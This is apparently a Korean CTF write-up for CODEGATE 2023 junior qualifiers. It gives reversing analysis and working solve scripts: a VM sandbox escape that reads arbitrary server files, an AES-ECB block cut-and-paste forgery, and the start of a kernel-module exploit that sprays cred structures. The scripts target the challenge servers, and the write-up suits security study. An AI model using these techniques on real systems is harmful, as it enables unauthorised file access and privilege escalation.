.text:00007FF7E1AA20C8 lea rcx, [rbp+130h+Buf1] .text:00007FF7E1AA20CC call stage_4 .text:00007FF7E1AA20D1 mov r8d, 40h ; \u0026#39;@\u0026#39; ; Size .text:00007FF7E1AA20D7 lea rdx, unk_7FF7E1AAD280 ; Buf2 .text:00007FF7E1AA20DE lea rcx, [rbp+130h+Buf1] ; Buf1 .text:00007FF7E1AA20E2 call j_memcmp .text:00007FF7E1AA20E7 test eax, eax .text:00007FF7E1AA20E9 jnz short loc_7FF7E1AA20F9 .text:00007FF7E1AA20EB lea rcx, aCorrect ; \u0026#34;Correct!\\n\u0026#34; .text:00007FF7E1AA20F2 call sub_7FF7E1AA11A9 .text:00007FF7E1AA20F7 jmp short loc_7FF7E1AA2105 .text:00007FF7E1AA20F9 ; --------------------------------------------------------------------------- .text:00007FF7E1AA20F9 .text:00007FF7E1AA20F9 loc_7FF7E1AA20F9: ; CODE XREF: sub_7FF7E1AA2030+B9↑j .text:00007FF7E1AA20F9 lea rcx, aNope ; \u0026#34;Nope...\\n\u0026#34; .text:00007FF7E1AA2100 call sub_7FF7E1AA11A9 .text:00007FF7E1AA2105 .text:00007FF7E1AA2105 loc_7FF7E1AA2105: ; CODE XREF: sub_7FF7E1AA2030+C7↑j .text:00007FF7E1AA2105 call cs:getchar .text:00007FF7E1AA210B xor eax, eax .text:00007FF7E1AA210D mov edi, eax .text:00007FF7E1AA210F lea rcx, [rbp+130h+var_150] .text:00007FF7E1AA2113 lea rdx, unk_7FF7E1AAAD00 .text:00007FF7E1AA211A call sub_7FF7E1AA133E .text:00007FF7E1AA211F mov eax, edi .text:00007FF7E1AA2121 mov rcx, [rbp+130h+var_18] .text:00007FF7E1AA2128 xor rcx, rbp ; StackCookie .text:00007FF7E1AA212B call j___security_check_cookie .text:00007FF7E1AA2130 lea rsp, [rbp+128h] .text:00007FF7E1AA2137 pop rdi .text:00007FF7E1AA2138 pop rbp .text:00007FF7E1AA2139 retn .text:00007FF7E1AA2139 ; } // starts at 7FF7E1AA2030 .text:00007FF7E1AA2139 sub_7FF7E1AA2030 endp .text:00007FF7E1AA2139 .text:00007FF7E1AA2139 ; -------------------------------------- SetUnhandledExceptionFilter에서 디버거가 없을때 실행되는 TopLevelExceptionFilter 콜백 함수를 등록했다.\n__int64 __fastcall sub_7FF7E1AA1830(_EXCEPTION_POINTERS *a1) { DWORD64 v2; // [rsp+68h] [rbp+48h] __int64 v3; // [rsp+68h] [rbp+48h] int n; // [rsp+84h] [rbp+64h] int j; // [rsp+84h] [rbp+64h] int k; // [rsp+84h] [rbp+64h] int m; // [rsp+84h] [rbp+64h] int ii; // [rsp+84h] [rbp+64h] int i; // [rsp+A4h] [rbp+84h] sub_7FF7E1AA13A2(byte_7FF7E1AB20A3); if ( a1-\u0026gt;ExceptionRecord-\u0026gt;ExceptionCode == 0x80000003 ) { ++a1-\u0026gt;ContextRecord-\u0026gt;Rip; a1-\u0026gt;ContextRecord-\u0026gt;Dr0 = (DWORD64)stage_1; a1-\u0026gt;ContextRecord-\u0026gt;Dr1 = (DWORD64)stage_2; a1-\u0026gt;ContextRecord-\u0026gt;Dr2 = (DWORD64)stage_3; a1-\u0026gt;ContextRecord-\u0026gt;Dr3 = (DWORD64)stage_4; a1-\u0026gt;ContextRecord-\u0026gt;Dr7 |= 0x44ui64; return 0xFFFFFFFFi64; } else if ( a1-\u0026gt;ExceptionRecord-\u0026gt;ExceptionCode == 0x80000004 ) { v2 = a1-\u0026gt;ContextRecord-\u0026gt;Dr6 \u0026amp; 0xF; if ( v2 ) { for ( i = 0; i \u0026lt; 4 \u0026amp;\u0026amp; (v2 \u0026amp; 1) != 1; ++i ) v2 \u0026gt;\u0026gt;= 1; if ( i ) { switch ( i ) { case 1: for ( j = 0; j \u0026lt; 256; ++j ) sbox[j] += 0x15; break; case 2: for ( k = 0; k \u0026lt; 256; ++k ) sbox_2[k] -= 0x3C; break; case 3: for ( m = 0; m \u0026lt; 64; ++m ) table_2[m] ^= 0x9Fu; break; } } else { for ( n = 0; n \u0026lt; 64; ++n ) table_1[n] ^= 5u; } v3 = 1i64; for ( ii = 0; ii \u0026lt; i; ++ii ) v3 *= 4i64; a1-\u0026gt;ContextRecord-\u0026gt;Dr7 \u0026amp;= ~v3; return 0xFFFFFFFFi64; } else { return 0i64; } } else { return 0i64; } } _EXCEPTION_POINTERS 구조체 포인터가 인자로 넘겨진다. 처음에 int3로 트랩이 걸리면 Dr0~Dr3에 함수 주소를 넣는다. Dr7에 0x44가 들어간다. Dr1, Dr3 부분만 걸리니 그 부분만 따로 연산을 진행하면 실제 테이블 값을 얻을 수 있다.\nstage1, stage2, stage3, stage4는 단순 xor 이거나 치환이다.\nExploitation 미리 테이블 구해놓고 단순 역연산을 하면 된다.\nExploit script table_1 = [120, 80, 27, 214, 131, 229, 135, 253, 203, 159, 151, 227, 55, 141, 240, 184, 235, 187, 212, 63, 180, 251, 193, 14, 10, 170, 92, 5, 134, 39, 138, 77, 70, 81, 110, 145, 93, 126, 205, 207, 118, 8, 92, 170, 220, 226, 81, 220, 2, 139, 7, 84, 128, 80, 136, 195, 178, 207, 144, 99, 25, 181, 185, 19] sbox = [45, 134, 204, 241, 109, 236, 18, 228, 50, 129, 87, 218, 132, 225, 250, 127, 28, 101, 233, 95, 170, 142, 121, 32, 51, 242, 110, 76, 253, 111, 208, 58, 10, 115, 116, 12, 92, 209, 182, 65, 207, 234, 146, 222, 240, 198, 2, 94, 147, 98, 30, 212, 86, 246, 206, 171, 55, 9, 164, 112, 158, 252, 192, 174, 145, 3, 96, 74, 82, 202, 5, 189, 103, 201, 78, 93, 53, 25, 200, 186, 173, 196, 43, 91, 89, 235, 194, 133, 23, 83, 213, 190, 150, 118, 36, 72, 149, 124, 154, 249, 245, 197, 168, 232, 238, 226, 29, 33, 137, 148, 126, 243, 223, 52, 90, 239, 193, 31, 40, 77, 187, 81, 73, 156, 136, 66, 237, 37, 14, 62, 16, 165, 169, 113, 152, 140, 251, 24, 139, 49, 57, 214, 248, 107, 38, 227, 56, 184, 61, 177, 20, 63, 125, 70, 255, 120, 178, 99, 195, 153, 162, 130, 13, 46, 7, 224, 181, 185, 54, 203, 88, 114, 26, 106, 220, 8, 210, 144, 27, 188, 199, 161, 39, 219, 48, 11, 143, 68, 1, 216, 15, 167, 67, 176, 183, 59, 21, 254, 104, 4, 97, 151, 119, 157, 122, 102, 215, 179, 180, 217, 117, 42, 135, 60, 163, 35, 160, 128, 229, 131, 244, 80, 22, 79, 47, 0, 100, 105, 231, 141, 19, 17, 41, 191, 221, 230, 155, 175, 211, 166, 69, 172, 108, 84, 64, 138, 44, 34, 85, 6, 75, 123, 159, 205, 247, 71] rev_sbox=[0 for _ in range(256)] sbox_2 = [4, 247, 89, 2, 96, 133, 175, 151, 56, 188, 212, 36, 28, 187, 208, 152, 172, 48, 37, 174, 130, 239, 191, 10, 92, 207, 88, 126, 131, 132, 71, 63, 39, 149, 43, 186, 235, 251, 69, 94, 103, 34, 134, 155, 1, 228, 17, 183, 97, 199, 157, 236, 62, 41, 164, 185, 25, 168, 234, 227, 206, 82, 177, 125, 169, 33, 195, 160, 20, 16, 79, 237, 52, 32, 167, 47, 217, 60, 50, 211, 121, 122, 205, 45, 173, 54, 198, 9, 68, 38, 105, 176, 19, 53, 250, 98, 119, 110, 153, 229, 159, 158, 170, 184, 107, 115, 179, 156, 166, 111, 87, 216, 161, 127, 73, 221, 109, 67, 194, 147, 61, 233, 108, 128, 11, 59, 145, 214, 255, 162, 46, 14, 180, 21, 242, 193, 139, 101, 120, 165, 238, 146, 24, 154, 118, 196, 99, 232, 55, 150, 249, 124, 142, 230, 113, 95, 163, 141, 70, 253, 13, 231, 243, 213, 210, 104, 49, 26, 102, 224, 31, 117, 76, 204, 140, 51, 136, 77, 245, 5, 80, 85, 200, 241, 44, 81, 226, 219, 181, 190, 74, 100, 192, 209, 178, 90, 22, 137, 3, 222, 66, 15, 86, 84, 148, 114, 12, 29, 123, 143, 244, 112, 201, 203, 64, 23, 40, 93, 129, 254, 246, 135, 27, 58, 171, 225, 57, 7, 144, 18, 220, 65, 75, 240, 30, 0, 42, 35, 138, 197, 218, 215, 8, 182, 72, 106, 252, 6, 78, 91, 223, 83, 116, 189, 248, 202] rev_sbox_2=[0 for _ in range(256)] table_2 = [163, 242, 234, 9, 129, 221, 211, 62, 14, 202, 9, 40, 252, 60, 48, 0, 99, 228, 26, 236, 215, 118, 141, 8, 215, 8, 61, 141, 113, 180, 159, 165, 10, 172, 196, 78, 8, 152, 251, 55, 157, 39, 242, 188, 68, 221, 164, 154, 24, 42, 43, 119, 3, 167, 134, 102, 159, 214, 96, 33, 158, 134, 218, 141] def rev_stage_1(x): for i in range(64): x[i] ^= table_1[i] def rev_stage_2(x): for i in range(64): x[i] = rev_sbox[x[i]] def rev_stage_3(x): for i in range(64): x[i] = rev_sbox_2[x[i]] def rev_stage_4(x): for i in range(64): x[i] ^= table_2[i] def Exception(f): global table_1, table_2, sbox,sbox_2 i = 0 if f\u0026amp;0xf: while True: if (f \u0026amp; 1) != 1: f\u0026gt;\u0026gt;=1 i+=1 else: break if i==0: for i in range(64): table_1[i] ^= 5 elif i ==1 : for i in range(256): sbox[i] += 0x15 sbox[i] \u0026amp;= 0xff elif i ==2 : for i in range(256): sbox_2[i] -= 0x3c sbox_2[i] \u0026amp;= 0xff elif i == 3: for i in range(64): table_2[i] ^= 0x9f cmp = [82, 55, 159, 25, 106, 8, 63, 194, 239, 209, 252, 184, 196, 232, 214, 4, 71, 159, 226, 6, 72, 105, 239, 51, 145, 73, 160, 54, 154, 51, 210, 144, 170, 23, 254, 113, 51, 243, 211, 17, 186, 97, 60, 30, 144, 206, 102, 96, 215, 139, 202, 135, 197, 239, 75, 201, 167, 218, 23, 131, 68, 80, 177, 4] # Exception(1\u0026lt;\u0026lt;0) Exception(1\u0026lt;\u0026lt;1) # Exception(1\u0026lt;\u0026lt;2) Exception(1\u0026lt;\u0026lt;3) for i in range(256): rev_sbox_2[sbox_2[i]] = i rev_sbox[sbox[i]] = i rev_stage_4(cmp) rev_stage_3(cmp) rev_stage_2(cmp) rev_stage_1(cmp) print(cmp) for i in cmp: print(chr(i),end=\u0026#39;\u0026#39;) codegate2023{c3fe22c964e2640b104fd3269a820f72}\nvspace Analysis from EngineStruct import Instruction from Engine import VMEngine import json import base64 import binascii import sys import signal def timeout_handler(signum, frame): print(\u0026#34;time out.\u0026#34;) raise SystemExit() # very very very very very very very very very very easy code virutalization teq def main(): code = input(\u0026#34;Input code:\u0026#34;) try: decode_data = base64.b64decode(code) except binascii.Error: print(\u0026#34;[!] base64 decode error!\u0026#34;) sys.exit(0) try: json_insns = json.loads(decode_data) except json.decoder.JSONDecodeError: print(\u0026#34;[!] json decode error!\u0026#34;) sys.exit(0) vme = VMEngine() vme.set_black_list([\u0026#34;flag\u0026#34;]) vme.set_file_options([\u0026#34;exists\u0026#34;]) instructions = vme.parse_json(json_insns) print(\u0026#34;[*] Init instructions ....\u0026#34;) print(\u0026#34;[+] Execute IL!\u0026#34;) print(\u0026#34;----------------------------------\u0026#34;) vme.run(instructions) print(\u0026#34;----------------------------------\u0026#34;) if __name__ == \u0026#34;__main__\u0026#34;: timeout_seconds = 3 signal.signal(signal.SIGALRM, timeout_handler) signal.alarm(timeout_seconds) main() from EngineStruct import Stack, Instruction import pathlib import types import time class VMEngine: def __init__(self): self.pc = 0 self.stack = Stack() self.values = {} self.set_black_list([]) self.set_file_options([\u0026#34;read_text\u0026#34;, \u0026#34;exists\u0026#34;, \u0026#34;glob\u0026#34;, \u0026#34;is_dir\u0026#34;, \u0026#34;read_bytes\u0026#34;, \u0026#34;mkdir\u0026#34;, \u0026#34;write_bytes\u0026#34;, \u0026#34;write_text\u0026#34;, \u0026#34;is_dir\u0026#34;, \u0026#34;is_file\u0026#34;]) def set_black_list(self, blacklist): self.values[\u0026#34;blacklist\u0026#34;] = blacklist def get_black_list(self): return self.values[\u0026#34;blacklist\u0026#34;] def set_file_options(self, options): self.values[\u0026#34;file_options\u0026#34;] = options def get_file_options(self): return self.values[\u0026#34;file_options\u0026#34;] def run(self, instructions): while True: if self.pc \u0026gt;= len(instructions): break insn = instructions[self.pc] match insn.opcode: case \u0026#34;😀\u0026#34;: self.stack.push(insn.opnd[0]) case \u0026#34;😄\u0026#34;: operand1 = self.stack.pop() operand2 = self.stack.pop() if type(operand1) != int or type(operand2) != int: print(\u0026#34;Operand type error!\u0026#34;) break self.stack.push(operand1 + operand2) case \u0026#34;😁\u0026#34;: operand1 = self.stack.pop() operand2 = self.stack.pop() if type(operand1) != int or type(operand2) != int: print(\u0026#34;Operand type error!\u0026#34;) break self.stack.push(operand1 - operand2) case \u0026#34;😆\u0026#34;: operand1 = self.stack.pop() operand2 = self.stack.pop() if type(operand1) != int or type(operand2) != int: print(\u0026#34;Operand type error!\u0026#34;) break self.stack.push(operand1 * operand2) case \u0026#34;🥹\u0026#34;: operand1 = self.stack.pop() operand2 = self.stack.pop() if type(operand1) != int or type(operand2) != int: print(\u0026#34;Operand type error!\u0026#34;) break self.stack.push(operand1 / operand2) case \u0026#34;😂\u0026#34;: operand1 = insn.opnd[0] value = self.stack.pop() if type(operand1) != str: print(\u0026#34;Operand type error!\u0026#34;) break self.values[operand1] = value case \u0026#34;😅\u0026#34;: operand1 = insn.opnd[0] if type(operand1) != str: print(\u0026#34;Operand type error!\u0026#34;) break try: value = self.values[operand1] self.stack.push(value) except KeyError: print(\u0026#34;Values key error!\u0026#34;) break case \u0026#34;🤣\u0026#34;: key = insn.opnd[0] operand1 = self.stack.pop() operand2 = self.stack.pop() if type(operand1) != type(operand2): print(\u0026#34;Operand type error!\u0026#34;) break self.values[key] = operand1 == operand2 case \u0026#34;🥲\u0026#34;: index = insn.opnd[0] if type(index) != int: print(\u0026#34;Operand type error!\u0026#34;) break self.pc += index continue case \u0026#34;😍\u0026#34;: index = insn.opnd[1] key = insn.opnd[0] if type(index) != int or type(key) != str: print(\u0026#34;Operand type error!\u0026#34;) break try: result = self.values[key] except KeyError: print(\u0026#34;Values key error!\u0026#34;) break if result: self.pc += index else: self.pc += 1 continue case \u0026#34;🥰\u0026#34;: index = insn.opnd[1] key = insn.opnd[0] if type(index) != int or type(key) != str: print(\u0026#34;Operand type error!\u0026#34;) break try: result = self.values[key] except KeyError: print(\u0026#34;Values key error!\u0026#34;) break if not result: self.pc += index else: self.pc += 1 continue case \u0026#34;✓\u0026#34;: print(self.stack.pop()) case \u0026#34;⭐️\u0026#34;: data1 = self.stack.pop() data2 = self.stack.pop() if type(data1) != str or type(data2) != str: print(\u0026#34;Operand type error!\u0026#34;) break self.stack.push(data1 + data2) case \u0026#34;♥️\u0026#34;: data = self.stack.pop() index = self.stack.pop() if type(data) != str or type(index) != int: print(\u0026#34;Operand type error!\u0026#34;) break try: self.stack.push(data[index]) except IndexError: print(\u0026#34;Out of index error!\u0026#34;) break case \u0026#34;➖\u0026#34;: char = self.stack.pop() if type(data) != str and len(data) != 1: print(\u0026#34;Operand type error!\u0026#34;) break self.stack.push(len(char)) case \u0026#34;🐸\u0026#34;: print(\u0026#34;Exit!\u0026#34;) break case \u0026#34;🧠\u0026#34;: filename = self.stack.pop() index = self.stack.pop() if type(filename) != str: print(\u0026#34;Operand type error!\u0026#34;) break _path = pathlib.Path(filename) if _path.name in self.get_black_list(): print(\u0026#34;Blacklist error!\u0026#34;) break options = self.get_file_options() try: result = _path.__getattribute__(options[index])(*insn.opnd) if types.GeneratorType == type(result): self.stack.push(list(result)) else: self.stack.push(result) except IndexError: print(\u0026#34;Out of range!\u0026#34;) break case \u0026#34;🗣️\u0026#34;: sleep_time = self.stack.pop() if type(sleep_time) != int: print(\u0026#34;Operand type error!\u0026#34;) break time.sleep(sleep_time) case _: print(\u0026#34;Wtf?\u0026#34;) break self.pc += 1 def parse_json(self, insntructions:list): result = [] for insn in insntructions: result.append(Instruction(insn[\u0026#34;opcode\u0026#34;], insn[\u0026#34;operands\u0026#34;])) return result 단순 VM이다. 여러 명령어들이 지원된다. 기본적으로 exists 같은 기능만 지원되고 블랙리스트도 걸려있다.\nExploitation 딕셔너리 키 검증이 없고 따로 제한이 있는 것도 아니라서 마음대로 파일 읽거나 확인이 가능하다.\nExploit script import json import base64 from pwn import * IL = [] def gen_IL(opcode,operands=[]): global IL IL.append({\u0026#34;opcode\u0026#34;:opcode, \u0026#34;operands\u0026#34;:operands}) def payload(x): json_string = json.dumps(x) return (base64.b64encode(json_string.encode(\u0026#39;utf-8\u0026#39;))) push = \u0026#34;😀\u0026#34; add = \u0026#34;😄\u0026#34; sub = \u0026#34;😁\u0026#34; mul = \u0026#34;😆\u0026#34; div = \u0026#34;🥹\u0026#34; reg_v = \u0026#34;😂\u0026#34; # values[opnd[0]] = value push_reg = \u0026#34;😅\u0026#34; # push self.values[opnd[0]] cmpeq = \u0026#34;🤣\u0026#34; # self.values[opnd[0]] = operand1 == operand2 jmp = \u0026#34;🥲\u0026#34; cont_jmp = \u0026#34;😍\u0026#34; # if self.values[opnd[0]] -\u0026gt; jmp opnd[1] conf_jmp = \u0026#34;🥰\u0026#34; # if not self.values[opnd[0]] -\u0026gt; jmp opnd[1] dump_stack = \u0026#34;✓\u0026#34; # print(self.stack.pop()) str_concat = \u0026#34;⭐️\u0026#34; str_index = \u0026#34;♥️\u0026#34; # string[index] strlen = \u0026#34;➖\u0026#34; # push(len(char)) done = \u0026#34;🐸\u0026#34; readfile = \u0026#34;🧠\u0026#34; # filename, index sleep_time = \u0026#34;🗣️\u0026#34; def push_string(x): x = x[::-1] gen_IL(push,x[0]) for i in range(len(x)-1): gen_IL(push,x[i+1]) gen_IL(str_concat) gen_IL(push,[[\u0026#34;NOOOO\u0026#34;]]) gen_IL(reg_v,[\u0026#34;blacklist\u0026#34;]) gen_IL(push_reg,[\u0026#34;blacklist\u0026#34;]) gen_IL(dump_stack) gen_IL(push,[[\u0026#34;read_text\u0026#34;, \u0026#34;exists\u0026#34;, \u0026#34;glob\u0026#34;, \u0026#34;is_dir\u0026#34;, \u0026#34;read_bytes\u0026#34;, \u0026#34;mkdir\u0026#34;, \u0026#34;write_bytes\u0026#34;, \u0026#34;write_text\u0026#34;, \u0026#34;is_dir\u0026#34;, \u0026#34;is_file\u0026#34;,\u0026#39;cwd\u0026#39;]]) gen_IL(reg_v,[\u0026#34;file_options\u0026#34;]) gen_IL(push_reg,[\u0026#34;file_options\u0026#34;]) gen_IL(dump_stack) gen_IL(push,[0]) push_string(\u0026#34;/home/ctf/codegate2023-read-plz\u0026#34;) # /etc/passwd gen_IL(readfile) gen_IL(dump_stack) # gen_IL(push,[2]) # push_string(\u0026#34;/home/ctf\u0026#34;) # gen_IL(readfile,[\u0026#39;**/*\u0026#39;]) # gen_IL(dump_stack) p = remote(\u0026#34;43.202.60.58\u0026#34;,5333) p.sendline(payload(IL)) p.interactive() # gen_IL(push,\u0026#34;read_text\u0026#34;) # gen_IL(reg_v,[\u0026#34;file_options\u0026#34;]) codegate2023{ab364274a7507b29b525cf4f1a00d71ec2d9bc278aad2d81fcddaf2710a6c52ee079cb6823860d9ea210bfc9e10b3a}\nCryptoGenius #!/usr/bin/python3 from hashlib import md5 from Crypto.Cipher import AES from base64 import * from secret import secret_key,flag BS = 16 KEY = secret_key FLAG = flag pad = lambda s: s + (BS - len(s) % BS) * \\ chr(BS - len(s) % BS) unpad = lambda s: s[:-ord(s[len(s) - 1:])] def encrypt(raw): raw = pad(raw) cipher = AES.new(KEY, AES.MODE_ECB) return b64encode(cipher.encrypt(raw.encode(\u0026#39;utf8\u0026#39;))) def decrypt(enc): enc = b64decode(enc) cipher = AES.new(KEY, AES.MODE_ECB) return unpad(cipher.decrypt(enc)).decode(\u0026#39;utf8\u0026#39;) def main(): while True: print (\u0026#34;\u0026#34;\u0026#34; ========= Your Behavior ========= 1. EXPERIMENT 2. SUBMIT 3. CLOSE \u0026#34;\u0026#34;\u0026#34;) behavior = int(input(\u0026#34;your behavior \u0026gt; \u0026#34;)) if behavior == 1: print (\u0026#34;I\u0026#39;m a crypto genius\u0026#34;) input_data = input(\u0026#34;Do you want to experiment? \u0026gt; \u0026#34;) if len(input_data) \u0026gt; 20: print (\u0026#34;It\u0026#39;s still too much...\u0026#34;) else: enc = encrypt(input_data) print (enc) elif behavior == 2: input_data = input (\u0026#34;Did you already solve the trick? \u0026gt; \u0026#34;) try: dec = decrypt(input_data) if len(dec) == 128 and dec == \u0026#34;6230ee81ac9d7785a16c75b93a89de9cbb9cbb2ddabaaadd035378c36a44eeacb371322575b467a4a3382e3085da281731557dadd5210f21b75e1e9b7e426eb7\u0026#34;: print (f\u0026#34;flag : {FLAG}\u0026#34;) else: print (\u0026#34;you\u0026#39;re still far away\u0026#34;) except: print (\u0026#34;you\u0026#39;re still far away\u0026#34;) continue elif behavior == 3: print (\u0026#34;BYE ... \u0026#34;) break else: print(\u0026#34;[*] Invalid input\u0026#34;) if __name__ == \u0026#39;__main__\u0026#39;: main () Exploitation MODE_ECB라서 블록간에 간섭이 없다. 16바이트씩 자르고, 다시 붙이면 된다.\nExploit script from pwn import * from base64 import * p = remote(\u0026#39;13.124.113.252\u0026#39;, 12345) t = \u0026#34;6230ee81ac9d7785a16c75b93a89de9cbb9cbb2ddabaaadd035378c36a44eeacb371322575b467a4a3382e3085da281731557dadd5210f21b75e1e9b7e426eb7\u0026#34; l = [] for i in range(0, len(t), 16): l.append(t[i:i+16]) enc = [] for i in range(len(l)): p.sendlineafter(b\u0026#39;\u0026gt; \u0026#39;,b\u0026#39;1\u0026#39;) p.sendlineafter(b\u0026#39;\u0026gt; \u0026#39;,l[i]) res = p.recvline() enc.append(res[2:-2]) print(enc) e = b\u0026#34;\u0026#34; for i in range(len(enc)-1): print(enc[i][:len(enc[i])//2]) e += b64decode(enc[i][:len(enc[i])//2]+b\u0026#39;==\u0026#39;) e += b64decode(enc[-1]) p.sendlineafter(b\u0026#39;\u0026gt;\u0026#39;,\u0026#39;2\u0026#39;) p.sendlineafter(b\u0026#39;\u0026gt; \u0026#39;,b64encode(e).decode()) p.interactive() codegate2023{68aeb23b86f64549bcd8ca414cd93a8d1de108da959d645952edc56c2c85d3702e0e36b9dd35f0f09a92ae97e0b785daec}\n","permalink":"https://msh1307.kr/blog/codegate_junior_2023_quals/","summary":"PCPU 대회 끝나기 2시간정도 전에 잡았었는데, 분석하기 빡세고 구조체도 많아서 시간내로 못풀었다. 나중에 끝나고 천천히 풀어봤다. 파이프라이닝이 적용된 VCPU 컨셉의 문제다.\nAnalysis __int64 __fastcall main(int a1, char **a2, char **a3) { init_(); input_validchk(); // opcode(1byte) | operands(3bytes) while ( PC \u0026lt;= instr_sz ) { run_cycle(); ++PC; } run_cycle(); run_cycle(); run_cycle(); print_cycle(); return 0LL; } int init_() { unsigned int v0; // eax v0 = time(0LL); srand(v0); setvbuf(stdin, 0LL, 2, 0LL); setvbuf(stdout, 0LL, 2, 0LL); IF_NODE = malloc(0x10uLL); ID_NODE = malloc(0x10uLL); OF_NODE = malloc(0x10uLL); EX_NODE = malloc(0x10uLL); REG = malloc(0x20uLL); memset(REG, 0, sizeof(REG_SETS)); init_m(IF_NODE); init_m(ID_NODE); init_m(OF_NODE); init_m(EX_NODE); ANON.","title":"CODEGATE 2023 Quals"},{"content":"K-Exploit 처음으로 잡아본 커널 문제다. 대회끝나고 50분뒤에 플래그가 나왔다. 아침에 BoB 필기랑 인적성보고 풀려했는데, 대회가 너무 빨리 끝났다. ;;\nAnalysis rootfs.img.gz 파일 시스템이 주어지고 bzImage가 주어진다.\nlocal_run.sh #!/bin/sh qemu-system-x86_64 \\ -m 128M \\ -cpu kvm64,+smep,+smap \\ -kernel bzImage \\ -initrd rootfs.img.gz \\ -snapshot \\ -nographic \\ -monitor /dev/null \\ -no-reboot \\ -append \u0026#34;console=ttyS0 kaslr kpti=1 quiet panic=1\u0026#34; \\ -s kaslr, kpti, smep, smap 다 빡세게 걸려있다.\nserver_run.sh #!/bin/sh qemu-system-x86_64 \\ -m 128M \\ -cpu kvm64,+smep,+smap \\ -kernel bzImage \\ -initrd $1 \\ -snapshot \\ -nographic \\ -monitor /dev/null \\ -no-reboot \\ -append \u0026#34;console=ttyS0 kaslr kpti=1 quiet panic=1\u0026#34; 똑같은데 디버깅 옵션만 빠진거같다.\nk-exploit.ko _fentry__(flip, cmd); copy_from_user(index, usr_, 0x20LL); if ( (_DWORD)cmd == 0x10002 ) // modify { idx = 2 * *(_DWORD *)index; if ( (unsigned int)(2 * *(_DWORD *)index) \u0026gt; 0x28 ) _ubsan_handle_out_of_bounds(\u0026amp;off_BA0, idx); v11 = arr[idx]; if ( !v11 ) return -1LL; cnt = sz; if ( sz \u0026gt; (unsigned __int64)arr[idx + 1] ) return -1LL; from_ = src; to_ = v11 + 8 * off; if ( (unsigned __int64)sz \u0026gt; 0x7FFFFFFF ) BUG(); goto LABEL_26; // copy_from_user(to_, from_, cnt); } ioctl로 modify 할 수 있다. 구조체를 userland에서 받아서 그걸 바탕으로 처리를 진행한다.\nif ( (unsigned int)cmd \u0026gt; 0x10002 ) { if ( (_DWORD)cmd == 0x10003 ) // CREATE { v15 = 2 * *(_DWORD *)index; if ( (unsigned int)(2 * *(_DWORD *)index) \u0026gt; 0x28 ) _ubsan_handle_out_of_bounds(\u0026amp;off_B80, v15); v6 = arr[v15]; if ( v6 ) { return -1LL; } else if ( (unsigned __int64)sz \u0026gt; 0xA0 ) { return -1LL; } else { to = _kmalloc(sz, 0x6000C0LL); if ( to ) { arr[v15] = to; if ( (unsigned __int64)sz \u0026gt; 0x7FFFFFFF ) BUG(); copy_from_user(to, src, sz); arr[v15 + 1] = sz; } else { return -1LL; } } } kmalloc을 한다.\nelse if ( (_DWORD)cmd == 0x10004 ) // DELETE { v4 = 2 * *(_DWORD *)index; if ( (unsigned int)(2 * *(_DWORD *)index) \u0026gt; 0x28 ) _ubsan_handle_out_of_bounds(\u0026amp;off_B60, v4); v5 = arr[v4]; if ( v5 ) { kfree(v5); arr[v4] = 0LL; return 0LL; } else { return -1LL; } } else { return 0LL; } return v6; } 얘는 kfree하는데 사용한다.\nif ( (_DWORD)cmd != 0x1337 ) { if ( (_DWORD)cmd != 0x10001 ) return 0LL; v8 = 2 * *(_DWORD *)index; if ( (unsigned int)(2 * *(_DWORD *)index) \u0026gt; 0x28 ) _ubsan_handle_out_of_bounds(\u0026amp;off_BC0, v8); usr = arr[v8]; if ( !usr ) return -1LL; if ( sz \u0026gt; (unsigned __int64)arr[v8 + 1] ) return -1LL; if ( (unsigned __int64)sz \u0026gt; 0x7FFFFFFF ) BUG(); copy_to_user(src, usr + 8 * off); return 0LL; } v17 = 2 * *(_DWORD *)index; if ( (unsigned int)(2 * *(_DWORD *)index) \u0026gt; 0x27 ) _ubsan_handle_out_of_bounds(\u0026amp;off_B40, v17); v6 = arr[v17]; if ( v6 ) { cnt = sz; from_ = src; to_ = *(_QWORD *)(v6 + 8 * off); if ( (unsigned __int64)sz \u0026gt; 0x7FFFFFFF ) BUG(); LABEL_26: copy_from_user(to_, from_, cnt); 0x1337은 포인터 참조 두번하고 userland의 데이터로 덮는다. 0x1001은 메모리를 읽어주고 userland로 돌려준다.\nimport hashlib import base64 from pwn import * REMOTE_IP = \u0026#34;20.196.194.8\u0026#34; REMOTE_PORT = 1234 EXPLOIT_URL = b\u0026#34;??\u0026#34; io = remote(REMOTE_IP, REMOTE_PORT) def solvepow(x, target): x = bytes.fromhex(x) target = bytes.fromhex(target) for i in range(256**3): if hashlib.md5(x + i.to_bytes(3, \u0026#34;big\u0026#34;)).digest() == target: return x.hex()+hex(i)[2:] def main(): line = io.recvuntil(b\u0026#34;\\n\u0026#34;) x = line.split(b\u0026#34;= \u0026#34;)[1][:26].decode(\u0026#34;utf-8\u0026#34;) target = line.split(b\u0026#34;= \u0026#34;)[2][:32].decode(\u0026#34;utf-8\u0026#34;) io.recvuntil(b\u0026#34;: \u0026#34;) io.sendline(bytes(solvepow(x, target), \u0026#34;utf-8\u0026#34;)) io.recvuntil(b\u0026#34;link\\n\u0026#34;) io.sendline(b\u0026#34;1\u0026#34;) io.recvuntil(b\u0026#34;: \u0026#34;) f = open(\u0026#34;./a.out\u0026#34;, \u0026#34;rb\u0026#34;) data = base64.b64encode(f.read()) f.close() io.sendline(data) # io.sendline(EXPLOIT_URL) io.interactive() return if __name__ == \u0026#39;__main__\u0026#39;: main() 이거 때문에 브포하기 힘들다.\nExploitation ~ # cat /proc/slabinfo | grep cred cred_jar 105 105 192 21 1 : tunables 0 0 0 : slabdata 5 5 0 slab info 확인해서 cred 크기 확인해보면, 0xc0이라서 잘 맞추고 스프레이하고 인접한 cred를 덮으려고 했는데 막혀있다. UAF도 불가능하다.\nif ( sz \u0026gt; (unsigned __int64)arr[idx + 1] ) return -1LL; from_ = src; to_ = v11 + 8 * off; if ( (unsigned __int64)sz \u0026gt; 0x7FFFFFFF ) BUG(); goto LABEL_26; // copy_from_user(to_, from_, cnt); if ( sz \u0026gt; (unsigned __int64)arr[v8 + 1] ) return -1LL; if ( (unsigned __int64)sz \u0026gt; 0x7FFFFFFF ) BUG(); copy_to_user(src, usr + 8 * off); return 0LL; off 검증이 없다. 원래 0x1337이나 0x1001도 있는데 어떤 곳에 사용해야할지 잘 모르겠고 시간도 부족해서, 간단하게 fork로 cred 구조체 heap spraying 하고 브포했다. 생각보다 엔트로피가 그렇게 크지 않아보여서 시도해봤는데, 막상 remote로 보낼때 pow_client.py 때문에 브포하기 힘들었다.\n/* Effective (overridable) subjective task credentials (COW): */ const struct cred __rcu\t*cred; #ifdef CONFIG_KEYS /* Cached requested key. */ struct 